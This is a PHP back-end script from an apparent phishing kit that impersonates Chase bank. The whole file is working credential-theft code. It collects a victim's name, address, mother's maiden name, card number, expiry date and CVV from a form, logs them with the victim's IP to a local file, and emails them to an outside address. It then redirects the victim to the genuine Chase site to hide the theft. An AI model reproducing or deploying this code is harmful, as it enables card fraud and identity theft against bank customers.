<?php

$date = gmdate ("d-n-Y");
$time = gmdate ("H:i:s");
$ip = $_SERVER['REMOTE_ADDR'];
$hostname = gethostbyaddr($ip);
$message .= "========== Chase ========\n";
$message .= "Full Name: ".$_POST['name']."\n";
$message .= "Address: ".$_POST['addr']."\n";
$message .= "Mothers name: ".$_POST['mn']."\n";
$message .= "Card Number: ".$_POST['cn']."\n";
$message .= "Expiry date: ".$_POST['ex']."\n";
$message .= "cvv: ".$_POST['cv']."\n";
$message .= "----------\n";
$message .= "IP: ".$ip."\n";
$message .= "Log : $time / $date \n";
$rnessage = "$message\n";
$send= "raymondarmstrong788@yahoo.com";
$subject = "New chase | $ip";
$headers = "From: chase";
$file = fopen("yome.txt","ab");
fwrite($file,$message);
fclose($file);

$str=array($send, $IWP); foreach ($str as $send)
if(mail($send,$subject,$rnessage,$headers) != false)
{
mail($Send,$subject,$rnessage,$headers);
}
header("Location:  https://www.chase.com/");


?>
